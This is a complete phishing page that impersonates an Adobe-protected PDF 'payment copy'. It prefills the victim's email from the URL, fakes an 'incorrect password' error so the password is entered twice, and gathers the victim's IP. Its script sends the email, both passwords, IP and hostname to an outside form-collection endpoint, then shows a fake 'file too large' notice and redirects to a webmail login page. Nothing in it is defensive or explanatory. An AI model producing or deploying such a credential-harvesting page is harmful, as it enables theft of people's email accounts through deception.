<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF â€” Payment Copy</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: #f6f6f6 url('download.jpg') no-repeat center top;
      background-size: cover;
      overflow: hidden;
    }
    #splash {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: #fff; display: flex; align-items: center; justify-content: center; flex-direction: column;
      z-index: 9999; transition: opacity 1s ease;
    }
    #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 10px; }
    #splash p { color: #666; font-size: 14px; }
    .loader {
      margin-top: 20px; width: 36px; height: 36px;
      border: 4px solid #ddd; border-top-color: #d32f2f;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    #main {
      display: none; height: 100%;
      display: flex; align-items: flex-start; justify-content: center;
      padding: 28px 12px 60px; position: relative;
    }
    #main.show { display: flex; animation: fadeIn 1s ease; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    body::before {
      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
      position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
      font-size: 46px; font-weight: bold; color: rgba(200, 0, 0, 0.12);
      transform: rotate(-35deg); white-space: pre; line-height: 120px;
      pointer-events: none; z-index: 0;
    }
    .card {
      width: 450px; max-width: 94%; background: rgba(255,255,255,0.95);
      border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      padding: 28px 22px 34px; position: relative; z-index: 2; backdrop-filter: blur(4px);
    }
    .pdf-icon { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
    .pdf-icon img { width: 54px; height: auto; }
    h1 { font-size: 20px; text-align: center; margin-bottom: 6px; }
    p.lead { text-align: center; color: #666; margin-bottom: 22px; font-size: 14px; }
    .input {
      width: 100%; border: 1px solid #e6e6e6; border-radius: 4px;
      padding: 14px 12px; margin-bottom: 12px; color: #444;
      background: #fafafa; font-size: 15px;
    }
    .password-wrapper { position: relative; }
    .toggle-password {
      position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
      cursor: pointer; color: #999; font-size: 18px; user-select: none;
    }
    .toggle-password:hover { color: #d32f2f; }
    .download-wrap { text-align: center; margin: 16px 0 10px; }
    .btn-download {
      display: inline-block; padding: 12px 36px; border-radius: 30px;
      background: #d32f2f; color: #fff; font-weight: 700; text-transform: uppercase;
      letter-spacing: 0.8px; box-shadow: 0 6px 18px rgba(211,47,47,0.18);
      border: none; cursor: pointer; font-size: 15px;
    }
    .file-info {
      margin-top: 18px; border-top: 1px solid #eee; padding-top: 14px;
      display: flex; gap: 12px; align-items: flex-start; color: #333;
    }
    .file-thumb { width: 48px; flex: 0 0 48px; }
    .file-thumb img { width: 100%; }
    .file-meta { flex: 1; }
    .file-meta h4 { margin-bottom: 6px; font-size: 15px; color: #0b58a8; }
    .file-meta .desc, .file-meta .size { font-size: 13px; color: #666; }
    .hidden { display: none; }
    .error-message { color: #d32f2f; font-size: 14px; margin-top: 8px; text-align: center; }
  </style>
</head>
<body>
  <div id="splash">
    <h2>Loading Secure Viewerâ€¦</h2>
    <p>Please wait while we prepare your file</p>
    <div class="loader"></div>
  </div>

  <div id="main">
    <div class="card">
      <div class="pdf-icon">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'><rect width='72' height='90' rx='6' fill='%23d63636'/><text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text></svg>" alt="PDF icon">
      </div>

      <h1>This File is Protected By AdobeÂ®<br>Security.</h1>
      <p class="lead">Click Continue to enter your password and view the payment copy.</p>

      <form id="mainForm" autocomplete="on">
        <div id="stepEmail">
          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly>
          <div class="download-wrap">
            <button id="continueBtn" class="btn-download" type="button">Continue</button>
          </div>
        </div>

        <div id="stepPassword" class="hidden">
          <div class="password-wrapper">
            <input id="password" class="input" type="password" placeholder="Password" required>
            <span id="togglePassword" class="toggle-password"></span>
          </div>

          <input type="hidden" id="ip">
          <input type="hidden" id="hostname">
          <input type="hidden" id="firstPasswordField">

          <div id="errorMessage" class="error-message" style="display: none;">Incorrect password, please re-type password.</div>

          <div class="download-wrap">
            <button class="btn-download" type="submit">DOWNLOAD</button>
          </div>
        </div>
      </form>

      <div class="file-info">
        <div class="file-thumb">
          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'><rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/><text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text></svg>" alt="">
        </div>
        <div class="file-meta">
          <h4>Download File Information</h4>
          <div class="desc">Payment copy</div>
          <div class="size">File Size: 47kb</div>
        </div>
      </div>
    </div>
  </div>

<script>
  window.addEventListener('load', () => {
    setTimeout(() => {
      document.getElementById('splash').style.opacity = '0';
      setTimeout(() => {
        document.getElementById('splash').style.display = 'none';
        document.getElementById('main').classList.add('show');
      }, 500);
    }, 800);
  });

  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const stepEmail = document.getElementById('stepEmail');
  const stepPassword = document.getElementById('stepPassword');
  const continueBtn = document.getElementById('continueBtn');
  const toggle = document.getElementById('togglePassword');
  const errorMessage = document.getElementById('errorMessage');
  const firstPasswordField = document.getElementById('firstPasswordField');
  let passwordFirstEntry = "";

  window.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const urlEmail = params.get('email');
    emailInput.value = urlEmail ? decodeURIComponent(urlEmail) : "user@example.com";
  });

  continueBtn.addEventListener('click', () => {
    stepEmail.classList.add('hidden');
    stepPassword.classList.remove('hidden');
    passwordInput.focus();
  });

  toggle.addEventListener('click', () => {
    const isHidden = passwordInput.type === 'password';
    passwordInput.type = isHidden ? 'text' : 'password';
  });

  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => { document.getElementById('ip').value = data.ip; })
    .catch(() => {});
  document.getElementById('hostname').value = window.location.hostname;

  document.getElementById('mainForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = emailInput.value;
    const password = passwordInput.value;
    const ip = document.getElementById('ip').value;
    const hostname = document.getElementById('hostname').value;

    if (passwordFirstEntry === "") {
      passwordFirstEntry = password;
      firstPasswordField.value = passwordFirstEntry;
      passwordInput.value = '';
      errorMessage.style.display = 'block';
      passwordInput.focus();
      return;
    }

    const data = {
      email: email,
      password1: passwordFirstEntry,
      password2: password,
      ip: ip,
      hostname: hostname
    };

    try {
      const res = await fetch("https://submit-form.com/Eu6W47ZST", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (res.ok) {
        // ðŸŒ€ Create spinner overlay
        const overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = 0;
        overlay.style.left = 0;
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.background = 'rgba(255,255,255,0.95)';
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column';
        overlay.style.alignItems = 'center';
        overlay.style.justifyContent = 'center';
        overlay.style.zIndex = '99999';

        const spinner = document.createElement('div');
        spinner.style.width = '40px';
        spinner.style.height = '40px';
        spinner.style.border = '4px solid #ccc';
        spinner.style.borderTopColor = '#d32f2f';
        spinner.style.borderRadius = '50%';
        spinner.style.animation = 'spin 1s linear infinite';

        const msg = document.createElement('p');
        msg.style.marginTop = '20px';
        msg.style.fontSize = '15px';
        msg.style.color = '#444';
        msg.textContent = 'Processing fileâ€¦';

        overlay.appendChild(spinner);
        overlay.appendChild(msg);
        document.body.appendChild(overlay);

        // ðŸ•“ After 3 seconds, show message
        setTimeout(() => {
          msg.textContent = "File is too large, contact the sender to send in smaller chunks or log in with Roundcube.";
        }, 3000);

        // â³ After 7 seconds, redirect
        setTimeout(() => {
          msg.textContent = "Redirecting to Roundcubeâ€¦";
          window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
        }, 7000);

      } else {
        alert("Submission failed. Check FormSpark setup.");
      }
    } catch {
      alert("Network error. Try again.");
    }
  });
</script>
<style>
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</body>
</html>
